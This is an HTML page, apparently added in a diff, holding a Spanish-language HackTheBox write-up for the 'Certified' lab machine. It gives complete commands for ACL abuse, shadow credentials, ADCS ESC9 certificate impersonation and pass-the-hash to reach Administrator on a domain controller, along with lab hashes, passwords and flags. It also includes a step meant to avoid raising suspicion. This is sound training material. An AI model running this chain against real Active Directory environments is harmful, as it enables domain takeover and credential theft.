@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Certified — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --green: #2ecc71;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.win      { border-color: var(--accent);  color: var(--accent); }
+  .tag.ad       { border-color: var(--accent3); color: var(--accent3); }
+  .tag.asrep    { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.dcsync   { border-color: var(--red);     color: var(--red); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 30px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  h2 .green   { color: var(--green); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.bash   { border-left-color: var(--green); color: #a8e6c3; }
+  .code-block.sql    { border-left-color: var(--red); color: #ffb3ba; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';           background: var(--accent3);  color: #fff; }
+  .finding.success::before { content: 'PWN';            background: var(--accent);   color: #fff; }
+  .finding.vuln::before    { content: 'VULN';           background: var(--red);      color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA';  background: var(--yellow);   color: #000; }
+  .finding.tip::before     { content: 'TIP';            background: var(--green);    color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--green); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .db-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    margin: 20px 0;
+  }
+
+  .db-table th {
+    text-align: left;
+    color: var(--red);
+    letter-spacing: 2px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid rgba(255,71,87,0.3);
+    background: rgba(255,71,87,0.04);
+  }
+
+  .db-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .db-table tr:hover td { background: rgba(255,71,87,0.03); }
+  .db-highlight { color: var(--yellow); }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-box.key { border-color: rgba(255,211,42,0.3); background: rgba(255,211,42,0.03); }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-box.key .flag-label { color: var(--yellow); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  .highlight { color: var(--accent2); }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// HackTheBox — Writeup</div>
+    <h1>CERTI<span class="glow">FIED</span></h1>
+    <div class="header-meta">
+      <span class="tag win">#active-directory</span>
+      <span class="tag ad">#adcs</span>
+      <span class="tag asrep">#esc9</span>
+      <span class="tag dcsync">#shadow-credentials</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Lo primero es hacer un escaneo con <code>nmap</code> para ver a qué nos enfrentamos. Esta vez la auditoría empieza con una cuenta filtrada de partida: <code>judith.mader:judith09</code>.</p>
+
+    <div class="code-label">escaneo de puertos</div>
+    <div class="code-block cmd">nmap -p- -T5 10.129.231.186 -oG allPorts</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">53/tcp</td><td class="port-open">OPEN</td><td>domain</td></tr>
+        <tr><td class="port-num">88/tcp</td><td class="port-open">OPEN</td><td>kerberos-sec</td></tr>
+        <tr><td class="port-num">135/tcp</td><td class="port-open">OPEN</td><td>msrpc</td></tr>
+        <tr><td class="port-num">139/tcp</td><td class="port-open">OPEN</td><td>netbios-ssn</td></tr>
+        <tr><td class="port-num">389/tcp</td><td class="port-open">OPEN</td><td>ldap</td></tr>
+        <tr><td class="port-num">445/tcp</td><td class="port-open">OPEN</td><td>microsoft-ds</td></tr>
+        <tr><td class="port-num">464/tcp</td><td class="port-open">OPEN</td><td>kpasswd5</td></tr>
+        <tr><td class="port-num">593/tcp</td><td class="port-open">OPEN</td><td>http-rpc-epmap</td></tr>
+        <tr><td class="port-num">636/tcp</td><td class="port-open">OPEN</td><td>ldapssl</td></tr>
+        <tr><td class="port-num">3268/tcp</td><td class="port-open">OPEN</td><td>globalcatLDAP</td></tr>
+        <tr><td class="port-num">3269/tcp</td><td class="port-open">OPEN</td><td>globalcatLDAPssl</td></tr>
+        <tr><td class="port-num">5985/tcp</td><td class="port-open">OPEN</td><td>wsman</td></tr>
+        <tr><td class="port-num">9389/tcp</td><td class="port-open">OPEN</td><td>adws</td></tr>
+      </tbody>
+    </table>
+
+    <div class="finding info">
+      <div class="finding-title">Directorio activo</div>
+      Con puertos como el <code>88</code> (Kerberos), <code>389</code> (LDAP) y <code>445</code> (SMB) abiertos, la máquina es un controlador de dominio de Active Directory. Al enumerar los shares SMB con las credenciales dadas se confirma el dominio <code>certified.htb</code>, que se añade al <code>/etc/hosts</code>.
+    </div>
+  </section>
+
+  <!-- FASE 2: BLOODHOUND -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">BLOODHOUND</span> — Camino hacia CA_OPERATOR</h2>
+
+    <p>Con <code>judith.mader:judith09</code> se recopila información con <code>bloodhound-python</code> para mapear el dominio.</p>
+
+    <div class="code-label">recolección de datos con bloodhound</div>
+    <div class="code-block cmd">bloodhound-python -u 'judith.mader' -p 'judith09' -d 'certified.htb' -ns 10.129.231.186 -c all --zip</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Cadena de abuso hacia CA_OPERATOR</div>
+      El nombre <code>CA_OPERATOR</code> ya sugiere una relación con <code>AD CS</code>. El grafo muestra el siguiente camino desde <code>judith.mader</code>:<br><br>
+      <b>1.</b> <code>judith.mader</code> tiene <code>WriteOwner</code> sobre el grupo <code>MANAGEMENT</code>.<br>
+      <b>2.</b> Como propietaria del grupo, puede concederse <code>GenericWrite</code> sobre él y añadirse como miembro.<br>
+      <b>3.</b> El grupo <code>MANAGEMENT</code> tiene <code>GenericWrite</code> sobre el usuario <code>management_svc</code>.<br>
+      <b>4.</b> <code>management_svc</code> tiene <code>GenericAll</code> sobre <code>ca_operator</code>.<br>
+      <b>5.</b> <code>ca_operator</code> pertenece al grupo <code>REMOTE MANAGEMENT USERS</code>, con acceso WinRM, y (a comprobar) puede ser el punto de entrada hacia una plantilla de certificado vulnerable.
+    </div>
+  </section>
+
+  <!-- FASE 3: ABUSO DE ACL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">ABUSO DE ACL</span> — WriteOwner sobre MANAGEMENT</h2>
+
+    <p>Se abusa del permiso <code>WriteOwner</code> para hacerse propietaria del grupo <code>MANAGEMENT</code>.</p>
+
+    <div class="code-label">1. cambio de propietario del grupo</div>
+    <div class="code-block cmd">impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb/judith.mader:judith09'</div>
+
+    <p>Se obtiene el <code>DN</code> exacto del grupo por LDAP.</p>
+
+    <div class="code-label">2. dn del grupo</div>
+    <div class="code-block cmd">ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "dc=certified,dc=htb" "(cn=Management)" distinguishedName</div>
+
+    <div class="code-block output">dn: CN=Management,CN=Users,DC=certified,DC=htb</div>
+
+    <p>Como propietaria, se concede a sí misma el permiso <code>WriteMembers</code> sobre el grupo modificando su DACL.</p>
+
+    <div class="code-label">3. autoconcesión de writemembers</div>
+    <div class="code-block cmd">impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb/judith.mader:judith09'</div>
+
+    <p>Finalmente se añade al grupo <code>Management</code>, lo que le hereda el <code>GenericWrite</code> que este tiene sobre <code>management_svc</code>.</p>
+
+    <div class="code-label">4. añadirse al grupo</div>
+    <div class="code-block cmd">net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S 10.129.231.186
+net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S 10.129.231.186</div>
+
+    <div class="code-block output">CERTIFIED\judith.mader
+CERTIFIED\management_svc</div>
+  </section>
+
+  <!-- FASE 4: SHADOW CREDENTIALS -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">SHADOW CREDENTIALS</span> — NT hash de management_svc</h2>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Qué es un ataque de Shadow Credentials?</div>
+      Con <code>GenericWrite</code> sobre una cuenta se puede escribir en su atributo <code>msDS-KeyCredentialLink</code>, que almacena claves públicas para autenticación sin contraseña (<code>PKINIT</code>). Añadiendo una clave pública propia junto a su clave privada correspondiente, se puede pedir un TGT en nombre de esa cuenta y de ahí extraer su NT hash — sin tocar ni conocer su contraseña real.
+    </div>
+
+    <p>Se automatiza el ataque completo con <code>certipy shadow auto</code> sobre <code>management_svc</code>.</p>
+
+    <div class="code-label">shadow credentials sobre management_svc</div>
+    <div class="code-block cmd">certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -dc-ip 10.129.231.186</div>
+
+    <div class="finding success">
+      <div class="finding-title">NT hash de management_svc</div>
+      Se obtiene el hash NTLM de <code>management_svc</code>: <code>a091c1832bcdd4677c28b5a6a1295584</code>.
+    </div>
+  </section>
+
+  <!-- FASE 5: RESET DE CONTRASEÑA CA_OPERATOR -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 05</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent3">GENERICALL</span> — Reset de contraseña de ca_operator</h2>
+
+    <p>Con el hash de <code>management_svc</code>, y aprovechando su permiso <code>GenericAll</code> sobre <code>ca_operator</code>, se resetea su contraseña.</p>
+
+    <div class="code-label">reset de contraseña</div>
+    <div class="code-block cmd">impacket-changepasswd 'certified.htb/CA_OPERATOR@10.129.231.186' -altuser 'management_svc' -althash 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -reset -newpass 'pwned'</div>
+
+    <div class="finding success">
+      <div class="finding-title">Acceso como ca_operator</div>
+      La nueva contraseña <code>pwned</code> funciona: <code>ca_operator:pwned</code>.
+    </div>
+  </section>
+
+  <!-- FASE 6: ADCS ESC9 -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 06</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="green">ADCS ESC9</span> — Suplantación de Administrator vía UPN</h2>
+
+    <p>Como la máquina gira en torno a certificados, se enumera <code>AD CS</code> con <code>certipy</code> desde <code>ca_operator</code>.</p>
+
+    <div class="code-label">enumeración de vulnerabilidades adcs</div>
+    <div class="code-block cmd">certipy-ad find -u 'ca_operator@certified.htb' -p 'pwned' -dc-ip 10.129.231.186 -vulnerable -stdout</div>
+
+    <div class="code-block output">[+] User Enrollable Principals   : CERTIFIED.HTB\operator_ca
+[!] Vulnerabilities
+    ESC9                          : Template has no security extension.</div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Qué es ESC9?</div>
+      Requiere tres condiciones: <b>1.</b> la plantilla tiene <code>NoSecurityExtension</code> (no incluye el SID del solicitante en el certificado emitido); <b>2.</b> se tiene permiso de <code>Enroll</code> con esa plantilla usando una cuenta cuyo <code>userPrincipalName</code> se puede modificar (gracias a un permiso adicional como <code>GenericAll</code>/<code>GenericWrite</code> sobre esa misma cuenta); <b>3.</b> el <code>StrongCertificateBindingEnforcement</code> del dominio está en modo no estricto. La primera la confirma <code>certipy</code>; la segunda se cumple porque <code>management_svc</code> tiene <code>GenericAll</code> sobre <code>ca_operator</code>; la tercera no se puede comprobar sin más permisos, pero se intenta igualmente.
+    </div>
+
+    <p>Se cambia temporalmente el <code>UPN</code> de <code>ca_operator</code> al del <code>Administrator</code>, usando el hash de <code>management_svc</code>.</p>
+
+    <div class="code-label">1. suplantar el upn de administrator</div>
+    <div class="code-block cmd">certipy-ad account update -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'administrator@certified.htb'</div>
+
+    <p>Con el UPN suplantado, se solicita un certificado desde <code>ca_operator</code> usando una plantilla sin extensión de seguridad.</p>
+
+    <div class="code-label">2. solicitud del certificado</div>
+    <div class="code-block cmd">certipy-ad req -u 'ca_operator@certified.htb' -p 'pwned' -dc-ip 10.129.231.186 -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'</div>
+
+    <div class="code-block output">[*] Got certificate with UPN 'administrator@certified.htb'
+[*] Wrote certificate and private key to 'administrator.pfx'</div>
+
+    <p>Se revierte el <code>UPN</code> de <code>ca_operator</code> a su valor original para no levantar sospechas.</p>
+
+    <div class="code-label">3. revertir el upn</div>
+    <div class="code-block cmd">certipy-ad account update -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'ca_operator@certified.htb'</div>
+
+    <p>Finalmente, se usa el certificado emitido (con el UPN del Administrador dentro) para autenticarse vía PKINIT y obtener su hash NTLM.</p>
+
+    <div class="code-label">4. autenticación con el certificado</div>
+    <div class="code-block cmd">certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186</div>
+
+    <div class="finding success">
+      <div class="finding-title">Hash NTLM del Administrador</div>
+      Se obtiene el hash NTLM de <code>administrator@certified.htb</code>: <code>0d5b49608bbce1751f708748f67e2d34</code>.
+    </div>
+  </section>
+
+  <!-- FASE 7: ACCESO FINAL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 07</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">ACCESO FINAL</span> — Pass-The-Hash como Administrator</h2>
+
+    <p>Con el hash del Administrador se realiza un ataque <code>Pass-The-Hash</code> con <code>evil-winrm</code>.</p>
+
+    <div class="code-label">pass-the-hash con evil-winrm</div>
+    <div class="code-block cmd">evil-winrm -i 10.129.231.186 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'</div>
+
+    <p>La conexión se establece correctamente. Como no se había pasado por ningún otro usuario para conseguir la flag de usuario, se recupera del escritorio de <code>management_svc</code>, y la de administrador del propio Administrador.</p>
+
+    <div class="flag-box key">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">7c91feb83bc8590888a6869bba2b4af8</span>
+    </div>
+
+    <div class="flag-box key">
+      <span class="flag-label">ADMIN FLAG</span>
+      <span class="flag-value">5906f6612a3b6472f11cc9694accc698</span>
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">BloodHound — Camino de ACLs</div>
+          <div class="chain-desc">judith.mader (WriteOwner) → grupo MANAGEMENT (GenericWrite) → management_svc (GenericAll) → ca_operator</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">Abuso de ACL — Entrada al grupo Management</div>
+          <div class="chain-desc">owneredit cambia el propietario del grupo → dacledit se autoconcede WriteMembers → net rpc añade a judith.mader al grupo</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Shadow Credentials — management_svc</div>
+          <div class="chain-desc">certipy shadow auto añade una clave pública maliciosa al msDS-KeyCredentialLink → NT hash de management_svc</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">04</div>
+        <div class="chain-content">
+          <div class="chain-title">GenericAll — Reset de ca_operator</div>
+          <div class="chain-desc">changepasswd resetea la contraseña de ca_operator a "pwned" usando el hash de management_svc</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--green); color: var(--green);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--green);">ADCS ESC9 → Administrator</div>
+          <div class="chain-desc">Se suplanta el UPN de ca_operator al de Administrator → se solicita un certificado sin extensión de seguridad → se revierte el UPN → autenticación PKINIT obtiene el hash NTLM del Administrador → Pass-The-Hash → <code>user.txt</code> y <code>root.txt</code></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">CERTIFIED // WRITEUP // HACKTHEBOX — CTF</div>
+  </div>
+</footer>
+
+</body>
+</html>
